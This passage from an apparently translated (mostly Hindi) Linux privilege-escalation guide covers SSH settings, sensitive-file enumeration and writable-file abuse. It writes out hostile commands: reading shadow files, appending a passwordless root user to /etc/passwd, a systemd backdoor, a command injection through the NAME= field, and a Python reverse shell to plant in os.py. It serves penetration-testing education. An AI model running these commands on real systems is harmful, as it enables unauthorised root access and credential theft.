- `yes`: root password और private key दोनों का उपयोग करके login कर सकता है
- `without-password` or `prohibit-password`: root केवल private key के साथ ही login कर सकता है
- `forced-commands-only`: root केवल private key का उपयोग करके और जब commands विकल्प निर्दिष्ट हों तभी login कर सकता है
- `no` : नहीं

### AuthorizedKeysFile

ऐसी फाइलों को निर्दिष्ट करता है जिनमें वे public keys शामिल होती हैं जिन्हें user authentication के लिए उपयोग किया जा सकता है। यह `%h` जैसे tokens रख सकता है, जिसे home directory से बदल दिया जाएगा। **आप absolute paths इंगित कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**. उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको **use your local SSH keys instead of leaving keys** (without passphrases!) अपने server पर छोड़ने के बजाय उपयोग करने की अनुमति देता है। इसलिए, आप ssh के जरिए **jump** **to a host** कर सकेंगे और वहां से **jump to another** **host** **using** the **key** जो आपके **initial host** में स्थित है।

आपको यह option `$HOME/.ssh.config` में इस तरह सेट करना होगा:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि अगर `Host` `*` है, तो हर बार जब उपयोगकर्ता किसी दूसरी मशीन पर कनेक्ट होता है, वह होस्ट keys तक पहुँच सकेगा (जो कि एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इन **विकल्पों** को **ओवरराइड** कर सकती है और इस कॉन्फ़िगरेशन को अनुमति या अस्वीकृत कर सकती है.\
फ़ाइल `/etc/sshd_config` `AllowAgentForwarding` कीवर्ड के साथ ssh-agent forwarding को **allow** या **denied** कर सकती है (default is allow).

यदि आप पाते हैं कि Forward Agent किसी environment में कॉन्फ़िगर है तो निम्न पृष्ठ पढ़ें क्योंकि **आप इसका दुरुपयोग करके escalate privileges कर सकते हैं**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें **ऐसे स्क्रिप्ट हैं जो तब निष्पादित होती हैं जब एक उपयोगकर्ता नया shell चलाता है**। इसलिए, यदि आप इनमें से किसी को भी **लिख या संशोधित कर सकते हैं तो आप escalate privileges कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile स्क्रिप्ट मिलती है, तो आपको इसे **संवेदनशील विवरणों** के लिए जाँचना चाहिए।

### Passwd/Shadow फ़ाइलें

OS के अनुसार `/etc/passwd` और `/etc/shadow` फ़ाइलें किसी अलग नाम से हो सकती हैं या कोई बैकअप मौजूद हो सकता है। इसलिए यह सलाह दी जाती है कि आप **उन सभी को ढूँढें** और **जाँचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि यह देखा जा सके **क्या फ़ाइलों के अंदर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कभी-कभी आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित में से किसी एक command के साथ एक password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर उपयोगकर्ता `hacker` जोड़ें और उत्पन्न पासवर्ड जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक नकली उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं।\
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` स्थित है `/etc/pwd.db` और `/etc/master.passwd`, साथ ही `/etc/shadow` का नाम बदलकर `/etc/spwd.db` रखा गया है।

आपको यह जाँचनी चाहिए कि क्या आप कुछ संवेदनशील फ़ाइलों में **लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सर्विस कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat सेवा कॉन्फ़िगरेशन फ़ाइल को संशोधित कर सकते हैं,** तो आप निम्न पंक्तियों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor तब सक्रिय होगा जब tomcat अगली बार शुरू होगा।

### फ़ोल्डर जांचें

इन फ़ोल्डरों में बैकअप या दिलचस्प जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आखिरी वाले को पढ़ न पाएं, पर कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **स्क्रिप्ट/बाइनरी PATH में**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), यह कई संभावित फाइलें खोजता है जो **passwords** रख सकती हैं।\
**Another interesting tool** जिसे आप इसके लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन सोर्स एप्लिकेशन है, स्थानीय कंप्यूटर पर संग्रहित कई **passwords** निकालने के लिए, Windows, Linux & Mac के लिए।

### Logs

यदि आप logs पढ़ सकते हैं, तो आप उनमें **रोचक/गोपनीय जानकारी उनके अंदर** पा सकते हैं। जितना अधिक अजीब log होगा, उतना अधिक रोचक होगा (शायद).\
Also, some "**bad**" configured (backdoored?) **audit logs** may allow you to **record passwords** inside audit logs as explained in this post: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत मददगार होगा।

### Shell फाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

You should also check for files containing the word "**password**" in its **name** or inside the **content**, and also check for IPs and emails inside logs, or hashes regexps.\
आपको उन फाइलों की भी जाँच करनी चाहिए जिनके नाम में या उनकी सामग्री में शब्द "**password**" हो, और logs के अंदर IPs और emails या hashes regexps की भी जाँच करें।\ मैं यहाँ यह सब कैसे करना है सूचीबद्ध नहीं कर रहा हूँ लेकिन यदि आप इच्छुक हैं तो आप [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा किए गए अंतिम checks देख सकते हैं।

## लिखने योग्य फाइलें

### Python library hijacking

यदि आप जानते हैं कि एक python script कहाँ से execute होने वाली है और आप उस फ़ोल्डर में **लिख सकते हैं** या आप **python libraries को modify** कर सकते हैं, तो आप OS library को modify करके उसमें backdoor डाल सकते हैं (यदि आप उस जगह लिख सकते हैं जहाँ python script execute होने वाली है, तो os.py library को copy और paste करें)।

To **backdoor the library** बस os.py library के अंत में निम्नलिखित लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक कमज़ोरी ऐसी है कि लॉग फ़ाइल या उसके parent डायरेक्टरीज़ पर **लिखने की अनुमति** वाले उपयोगकर्ता संभावित रूप से privileges escalate कर सकते हैं। ऐसा इसलिए होता है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, को arbitrary फाइलें execute करने के लिए manipulate किया जा सकता है, खासकर उन डायरेक्टरीज़ में जैसे _**/etc/bash_completion.d/**_. यह ज़रूरी है कि permissions की जाँच सिर्फ _/var/log_ में ही न करें बल्कि उन किसी भी डायरेक्टरी में करें जहाँ log rotation लागू होती है।

> [!TIP]
> यह कमज़ोरी `logrotate` के version `3.18.0` और पुराने पर असर करती है

इस कमज़ोरी के बारे में अधिक विस्तृत जानकारी इस पेज पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमज़ोरी का exploit [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह कमज़ोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप logs बदल सकते हैं, यह देखें कि कौन उन logs को manage कर रहा है और जांचें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई यूजर _/etc/sysconfig/network-scripts_ में एक `ifcf-<whatever>` script **लिख** सकता है **या** किसी मौजूदा script को **समायोजित** कर सकता है, तो आपकी **system is pwned**।

Network scripts, _ifcg-eth0_ उदाहरण के लिए नेटवर्क कनेक्शन्स के लिए उपयोग होते हैं। वे बिल्कुल .INI files की तरह दिखते हैं। हालांकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे मामले में, इन network scripts में निर्धारित `NAME=` सही तरीके से handle नहीं किया जाता है। यदि नाम में **white/blank space** है तो system नाम में white/blank space के बाद वाले हिस्से को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद का हर कुछ root के रूप में execute हो जाता है**।

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें कि Network और /bin/id के बीच एक रिक्त स्थान है_)

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का स्थान है — यह पारंपरिक Linux service management system है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के लिए स्क्रिप्ट शामिल होती हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` Upstart से जुड़ा है — Ubuntu द्वारा पेश किया गया नया service management जो service management कार्यों के लिए configuration files का उपयोग करता है। Upstart में संक्रमण के बावजूद, compatibility layer के कारण SysVinit स्क्रिप्ट्स अभी भी Upstart कॉन्फ़िगरेशनों के साथ उपयोग में रहती हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसी उन्नत सुविधाएँ प्रदान करता है। यह फाइलों को वितरण पैकेजों के लिए `/usr/lib/systemd/` और एडमिन संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल हो जाती है।

## अन्य तरकीबें

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks अक्सर privileged kernel functionality को userspace manager को एक्सपोज़ करने के लिए एक syscall को hook करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक स्थानीय ऐप को manager का impersonate करने और पहले से-rooted डिवाइसेज़ पर root तक escalate करने में सक्षम बना सकती है। अधिक जानकारी और exploitation विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery प्रक्रिया command lines से किसी binary path को निकाल सकती है और उसे privileged context में `-v` के साथ execute कर सकती है। permissive patterns (उदा., \S का उपयोग) writable स्थानों में attacker-staged listeners (उदा., /tmp/httpd) से मैच कर सकते हैं, जिससे root के रूप में execution हो सकती है (CWE-426 Untrusted Search Path)।

और अधिक जानें और अन्य discovery/monitoring stacks पर लागू होने वाले सामान्यीकृत पैटर्न को यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel सुरक्षा उपाय

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
